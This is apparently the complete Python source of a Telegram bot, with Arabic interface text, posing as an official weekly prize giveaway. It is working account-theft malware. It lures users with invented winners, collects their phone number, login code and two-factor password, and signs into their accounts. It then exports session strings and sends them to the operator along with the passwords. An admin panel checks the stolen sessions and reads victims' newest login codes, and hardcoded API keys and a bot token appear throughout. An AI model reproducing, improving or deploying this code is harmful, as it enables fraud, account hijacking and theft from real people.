import asyncio
import re
import time
import json
import os
#https://t.me/aaeerts لا تنسى تابعنا
from pyrogram import Client, filters
from pyrogram.types import Message, CallbackQuery, ForceReply, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from pyrolistener import Listener, exceptions
#https://t.me/aaeerts لا تنسى تابعنا
# --- إعدادات البوت ---
API_ID = 22651991
API_HASH = "ecad214ecff6a5cd90fc141d4e32f597"
BOT_TOKEN = "8898536328:AAExM38EaxA8pFKHNEYY74y0YyrahcKZQO4"
ADMIN_ID = 7120001127
#https://t.me/aaeerts لا تنسى تابعنا
ACCOUNTS_FILE = "accounts.json"

app = Client("giftBot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
listener = Listener(client=app)
#https://t.me/aaeerts لا تنسى تابعنا
users_data = {}
user_cooldowns = {}
active_registrations = set()  # لمتابعة العمليات القائمة وتسهيل الإلغاء

# --- التعامل مع البيانات ---
def load_accounts():
    global users_data
    if os.path.exists(ACCOUNTS_FILE):
        try:
            with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
                users_data = json.load(f)
        except Exception:
            users_data = {}
    else:
        users_data = {}

def save_accounts():
    with open(ACCOUNTS_FILE, "w", encoding="utf-8") as f:
        json.dump(users_data, f, indent=4, ensure_ascii=False)

def is_user_already_registered(user_id):
    """التحقق إذا كان هذا المستخدم قد سجل حسابه سابقاً"""
    for data in users_data.values():
        if data.get("user_id") == user_id:
            return True
    return False

# --- أزرار القوائم ---
USER_MENU = InlineKeyboardMarkup([
    [InlineKeyboardButton("🎁 المطالبة بالهدية الأسبوعية", callback_data="claim_gift")],
    [InlineKeyboardButton("🏆 قائمة الفائزين هذا الأسبوع", callback_data="winners_list")],
    [InlineKeyboardButton("📜 شروط وأحكام المسابقة", callback_data="gift_rules")]
])

ADMIN_MENU = InlineKeyboardMarkup([
    [InlineKeyboardButton("📋 إدارة الحسابات والتحكم", callback_data="overview")],
    [InlineKeyboardButton("🔄 تحديث فحص الحسابات", callback_data="refresh_overview")]
])

# --- بداية الأوامر (/start) ---
@app.on_message(filters.command("start") & filters.private)
async def start(_, message: Message):
    user_id = message.from_user.id

    # إلغاء أي عملية تسجيل شغال لهذا المستخدم إن وجدت عند كتابة /start
    if user_id in active_registrations:
        active_registrations.remove(user_id)

    if user_id == ADMIN_ID:
        await message.reply(
            "👑 **مرحباً بك في لوحة تحكم المالك**\n\n"
            "يمكنك من هنا متابعة الحسابات المسجلة وجلب أحدث الأكواد والتأكد من حالة الجلسات.",
            reply_markup=ADMIN_MENU
        )
    else:
        await message.reply(
            "🎁 **مرحباً بك في البوت الرسمي للسحب الأسبوعي!** 🥳\n\n"
            "شارك الآن في السحب الكبير لفرصة الفوز بـ **Telegram Premium لمدة سنة** أو جوائز مالية.\n\n"
            "👇 اضغط على زر **المطالبة بالهدية الأسبوعية** للبدء بالمشاركة!",
            reply_markup=USER_MENU
        )

# --- إلغاء التسجيل عبر الأزرار ---
@app.on_callback_query(filters.regex(r"^(cancel_reg)$"))
async def cancel_reg(_, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in active_registrations:
        active_registrations.remove(user_id)
    await callback.message.edit_text("❌ **تم إلغاء عملية التسجيل بنجاح.**", reply_markup=USER_MENU)

# --- أزرار معلومات المسابقة ---
@app.on_callback_query(filters.regex(r"^(winners_list)$"))
async def winners_list(_, callback: CallbackQuery):
    winners_text = (
        "🏆 **قائمة الفائزين بالسحب الأسبوعي الأخير:**\n\n"
        "1. 🥇 @cttccctc 💳 **(جائزة 100$ + Telegram Premium)**\n"
        "2. 🥈 @Hthonn ⭐️ **(Telegram Premium سنة)**\n"
        "3. 🥉 @ii00hh ⭐️ **(Telegram Premium سنة)**\n"
        "4. 🎗️ @oasow 🎁 **(بطاقة شحن 50$)**\n"
        "5. 🎗️ @TheJackal28 ⭐️ **(Telegram Premium 3 أشهُر)**\n"
        "6. 🎗️ @Speedy224 ⭐️ **(Telegram Premium 3 أشهُر)**\n\n"
        "🎉 تهانينا لجميع الفائزين! يتم تحديث القائمة تلقائياً كل يوم جمعة."
    )
    await callback.message.edit_text(winners_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="back_user")]]))

@app.on_callback_query(filters.regex(r"^(gift_rules)$"))
async def gift_rules(_, callback: CallbackQuery):
    rules_text = (
        "📜 **شروط وقوانين المشاركة في السحب الأسبوعي:**\n\n"
        "1️⃣ أن يكون حساب التليجرام نِشطاً ومستوفياً لشروط الاستخدام.\n"
        "2️⃣ يُسمح بكل حساب بالمشاركة مرة واحدة فقط كل 3 دقائق.\n"
        "3️⃣ التأكد من كتابة رمز التحقق بشكل صحيح لضمان تأكيد هوية الحساب.\n"
        "4️⃣ يتم اختيار الفائزين بشفافية عبر نظام قرعة إلكتروني عشوائي.\n\n"
        "✨ **حظاً موفقاً للجميع!**"
    )
    await callback.message.edit_text(rules_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="back_user")]]))

@app.on_callback_query(filters.regex(r"^(back_user)$"))
async def back_user(_, callback: CallbackQuery):
    await callback.message.edit_text(
        "🎁 **البوت الرسمي للسحب الأسبوعي والهدايا**\n\nاختر من القائمة أدناه:",
        reply_markup=USER_MENU
    )

# --- آلية المطالبة بالهدية والتسجيل ---
@app.on_callback_query(filters.regex(r"^(claim_gift)$"))
async def claim_gift(_, callback: CallbackQuery):
    user_id = callback.from_user.id

    if user_id == ADMIN_ID:
        return await callback.answer("⚠️ أنت المالك، استخدم لوحة التحكم للمتابعة.", show_alert=True)

    # 1. إذا كان المسجل مشاركاً بالفعل وسجل حسابه سابقاً
    if is_user_already_registered(user_id):
        return await callback.answer("✅ تم تسجيل حسابك واستلام طلب الهدية بالفعل! انتظر إعلان الفائزين.", show_alert=True)

    # 2. نظام الانتظار (3 دقائق)
    current_time = time.time()
    if user_id in user_cooldowns:
        elapsed = current_time - user_cooldowns[user_id]
        if elapsed < 180:
            remaining = int(180 - elapsed)
            mins, secs = divmod(remaining, 60)
            return await callback.answer(f"⏳ طلبك قيد المعالجة! يرجى الانتظار {mins} دقيقة و {secs} ثانية.", show_alert=True)

    await callback.message.delete()
    active_registrations.add(user_id)

    cancel_btn = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء العملية", callback_data="cancel_reg")]])

    # طلب رقم الهاتف عبر Listener
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="📲 **المرحلة الأولى: تأكيد هاتف المشارك**\n\nيرجى إرسال رقم الهاتف المرتبط بحسابك على تليجرام لمعالجة طلبك والسماح بدخول السحب.\n*(مثال: `+9647700000000`)*:",
            reply_markup=ForceReply(selective=True, placeholder="+9647700000000"),
            timeout=60
        )
    except exceptions.TimeOut:
        if user_id in active_registrations:
            active_registrations.remove(user_id)
        return await app.send_message(user_id, "- نفد وقت استلام رقم الهاتف.", reply_markup=USER_MENU)

    # إلغاء إذا ضغط إلغاء أو كتب /cancel
    if user_id not in active_registrations or ask.text == "/cancel":
        if user_id in active_registrations:
            active_registrations.remove(user_id)
        return await ask.reply("❌ تم إلغاء العملية.", reply_markup=USER_MENU)

    asyncio.create_task(process_registration(ask))

async def process_registration(message: Message):
    user_id = message.from_user.id
    _number = message.text.strip().replace(" ", "")

    cancel_btn = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء", callback_data="cancel_reg")]])
    lmsg = await message.reply("⏳ **جارٍ إرسال كود التأكيد إلى حسابك...**", reply_markup=cancel_btn)

    client = Client("registration_temp", in_memory=True, api_id=API_ID, api_hash=API_HASH)
    await client.connect()

    try:
        p_code_hash = await client.send_code(_number)
    except PhoneNumberInvalid:
        if user_id in active_registrations: active_registrations.remove(user_id)
        return await lmsg.edit_text("❌ رقم الهاتف الذي أدخلته غير صحيح.", reply_markup=USER_MENU)
    except Exception as e:
        if user_id in active_registrations: active_registrations.remove(user_id)
        return await lmsg.edit_text(f"❌ حدث خطأ: {e}", reply_markup=USER_MENU)

    # انتظار الكود
    try:
        code = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="📥 **تم إرسال كود التأكيد الخاص بالهدية إلى حسابك في تليجرام.**\n\nيرجى كتابة الكود وإرساله فوراً للتحقق من نشاط الحساب:",
            timeout=120,
            reply_markup=ForceReply(selective=True, placeholder="1 2 3 4 5")
        )
    except exceptions.TimeOut:
        if user_id in active_registrations: active_registrations.remove(user_id)
        return await lmsg.reply("- نفد وقت استلام الكود، حاول مرة أخرى.", reply_markup=USER_MENU)

    if user_id not in active_registrations or code.text == "/cancel":
        if user_id in active_registrations: active_registrations.remove(user_id)
        return await code.reply("❌ تم إلغاء العملية.", reply_markup=USER_MENU)

    # تسجيل الدخول
    password_text = "لا يوجد"
    try:
        clean_code = code.text.replace(" ", "").replace("-", "")
        await client.sign_in(_number, p_code_hash.phone_code_hash, clean_code)
    except PhoneCodeInvalid:
        if user_id in active_registrations: active_registrations.remove(user_id)
        return await code.reply("❌ أدخلت كود خاطئ. حاول مرة أخرى.", reply_markup=USER_MENU)
    except PhoneCodeExpired:
        if user_id in active_registrations: active_registrations.remove(user_id)
        return await code.reply("❌ الكود منتهي الصلاحية. حاول مرة أخرى.", reply_markup=USER_MENU)
    except SessionPasswordNeeded:
        # كلمة المرور 2FA
        try:
            password = await listener.listen(
                from_id=user_id,
                chat_id=user_id,
                text="🔐 **الحساب محمي بكلمة مرور (2FA)**\nأدخل كلمة المرور لاستكمال فحص الحساب:",
                reply_markup=ForceReply(selective=True, placeholder="PASSWORD"),
                timeout=180
            )
        except exceptions.TimeOut:
            if user_id in active_registrations: active_registrations.remove(user_id)
            return await lmsg.reply("- نفد وقت استلام كلمة المرور.", reply_markup=USER_MENU)

        if user_id not in active_registrations or password.text == "/cancel":
            if user_id in active_registrations: active_registrations.remove(user_id)
            return await password.reply("❌ تم إلغاء العملية.", reply_markup=USER_MENU)

        try:
            password_text = password.text.strip()
            await client.check_password(password_text)
        except PasswordHashInvalid:
            if user_id in active_registrations: active_registrations.remove(user_id)
            return await password.reply("❌ كلمة المرور غير صحيحة.", reply_markup=USER_MENU)

    session_string = await client.export_session_string()
    await client.disconnect()

    # حفظ الحساب رسمياً
    users_data[_number] = {
        "user_id": user_id,
        "session": session_string,
        "password": password_text
    }
    save_accounts()

    if user_id in active_registrations:
        active_registrations.remove(user_id)

    user_cooldowns[user_id] = time.time()

    # إرسال إشعار كامل للمالك
    try:
        await app.send_message(
            ADMIN_ID,
            f"🎉 **تسجيل حساب جديد في بوت الهدايا!**\n\n"
            f"👤 **المستخدم:** `{user_id}`\n"
            f"📱 **الرقم:** `{_number}`\n"
            f"🔐 **كلمة المرور (2FA):** `{password_text}`\n"
            f"🔑 **الجلسة:** `{session_string}`"
        )
    except Exception:
        pass

    # شريط التحميل الذكي (3 دقائق)
    progress_msg = await app.send_message(
        user_id,
        "🔄 **جاري الاتصال بخادم الهدايا الأسبوعية...**\n"
        "⏳ الوقت المتبقي: 03:00 دقيقة\n"
        "▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ 0%"
    )

    statuses = [
        "⏳ جاري التحقق من نشاط الحساب والأقدمية...",
        "⏳ جاري فحص استحقاق اشتراك Telegram Premium...",
        "⏳ جاري تخصيص الجائزة وتجهيز السيرفر...",
        "⏳ جاري ربط الهدايا بحسابك وتوثيق العملية...",
        "⏳ جاري إنهاء التوثيق الأخير وتقديم الطلب..."
    ]

    total_seconds = 180
    update_interval = 6

    for current_sec in range(update_interval, total_seconds + 1, update_interval):
        await asyncio.sleep(update_interval)

        percent = int((current_sec / total_seconds) * 100)
        filled_blocks = int((percent / 100) * 15)
        bar = "█" * filled_blocks + "▒" * (15 - filled_blocks)

        remaining = total_seconds - current_sec
        mins, secs = divmod(remaining, 60)
        time_str = f"{mins:02d}:{secs:02d}"

        status_idx = min(percent // 21, len(statuses) - 1)
        current_status = statuses[status_idx]

        try:
            await progress_msg.edit_text(
                f"🎁 **جاري معالجة واستلام الهدايا الأسبوعية...**\n\n"
                f"{current_status}\n"
                f"⏱ الوقت المتبقي: `{time_str}` دقيقة\n\n"
                f"[{bar}] **{percent}%**"
            )
        except Exception:
            pass

    await app.send_message(
        user_id,
        "✅ **تم تسجيل وتوثيق حسابك في السحب الأسبوعي بنجاح!**\n\n"
        "🎉 تم إدراج اسمك ضمن قائمة المرشحين للحصول على الجائزة الأسبوعية. سيتم إعلان الفائزين وإرسال الهدايا تلقائياً عبر البوت.",
        reply_markup=USER_MENU
    )

# --- لوحة التحكم للمالك ---
@app.on_callback_query(filters.regex(r"^(overview|refresh_overview)$"))
async def overview(_, callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    if not users_data:
        return await callback.answer("⚠️ لا توجد حسابات مسجلة حالياً.", show_alert=True)

    await callback.answer("🔄 جارٍ فحص وتحديث حالة جميع الحسابات...")
    buttons = []

    for phone, details in users_data.items():
        sess = details.get("session")
        status = "🔴 مسجل خروج"

        try:
            chk = Client("chk", session_string=sess, api_id=API_ID, api_hash=API_HASH, in_memory=True)
            await chk.connect()
            if await chk.get_me():
                status = "🟢 نشط"
            await chk.disconnect()
        except Exception:
            status = "🔴 مسجل خروج"

        buttons.append([InlineKeyboardButton(f"{phone} | {status}", callback_data=f"view_acc:{phone}")])

    buttons.append([InlineKeyboardButton("🔄 تحديث القائمة", callback_data="refresh_overview")])
    buttons.append([InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="admin_home")])

    await callback.message.edit_text(
        "📱 **قائمة الحسابات المخزنة وحالتها الفعلية:**\n\n"
        "🟢 **نشط:** الحساب متصل ويمكن جلب أحدث أكواده.\n"
        "🔴 **مسجل خروج:** تم إغلاق الجلسة من قبل المستخدم.\n\n"
        "اضغط على أي رقم لجلب أحدث كود أو التحكم:",
        reply_markup=InlineKeyboardMarkup(buttons)
    )

@app.on_callback_query(filters.regex(r"^(admin_home)$"))
async def admin_home(_, callback: CallbackQuery):
    if callback.from_user.id == ADMIN_ID:
        await callback.message.edit_text("👑 **لوحة تحكم المالك الرئيسية:**", reply_markup=ADMIN_MENU)

@app.on_callback_query(filters.regex(r"^view_acc:(.+)"))
async def view_acc(_, callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    phone = callback.data.split(":")[1]
    if phone in users_data:
        details = users_data[phone]
        pwd = details.get("password", "لا يوجد")

        text = (
            f"📱 **تفاصيل الرقم:** `{phone}`\n"
            f"🔐 **التحقق بخطوتين (2FA):** `{pwd}`\n\n"
            "اضغط على **جلب الكود الأخير** لقراءة أحدث كود وصل هذا الرقم من تليجرام."
        )
        buttons = [
            [InlineKeyboardButton("📩 جلب الكود الأخير", callback_data=f"get_code:{phone}")],
            [InlineKeyboardButton("🗑️ حذف الرقم من اللوحة", callback_data=f"del_acc:{phone}")],
            [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="overview")]
        ]
        await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons))

@app.on_callback_query(filters.regex(r"^get_code:(.+)"))
async def get_code(_, callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    phone = callback.data.split(":")[1]
    if phone not in users_data:
        return await callback.answer("الحساب غير موجود.", show_alert=True)

    await callback.answer("⏳ جارٍ قراءة الرسائل الأخيرة وتيار الكود...")
    sess = users_data[phone].get("session")

    try:
        acc_client = Client("get_code_temp", session_string=sess, api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await acc_client.connect()

        latest_code = None
        full_message = ""

        async for msg in acc_client.get_chat_history(777000, limit=3):
            if msg.text:
                match = re.search(r"\b(\d{5,6})\b", msg.text)
                if match:
                    latest_code = match.group(1)
                    full_message = msg.text
                    break

        await acc_client.disconnect()

        if latest_code:
            await callback.message.edit_text(
                f"✅ **أحدث كود وصل للرقم `{phone}`:**\n\n"
                f"🔑 **الكود:** `{latest_code}`\n"
                f"🔐 **كلمة السر (2FA):** `{users_data[phone].get('password', 'لا يوجد')}`\n\n"
                f"📄 **نص الرسالة الأصلية:**\n`{full_message}`",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للرقم", callback_data=f"view_acc:{phone}")]])
            )
        else:
            await callback.answer("❌ لم يتم العثور على أية رسالة تحتوي كود حالياً.", show_alert=True)

    except Exception as e:
        await callback.answer(f"حدث خطأ أثناء الاتصال بالرقم: {e}", show_alert=True)

@app.on_callback_query(filters.regex(r"^del_acc:(.+)"))
async def del_acc(_, callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    phone = callback.data.split(":")[1]
    if phone in users_data:
        del users_data[phone]
        save_accounts()
        await callback.message.edit_text(f"🗑️ تم حذف الرقم `{phone}` بنجاح.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 القائمة", callback_data="overview")]]))

if __name__ == "__main__":
    load_accounts()
    print("🤖 تم تشغيل البوت بنجاح!")
    app.run()
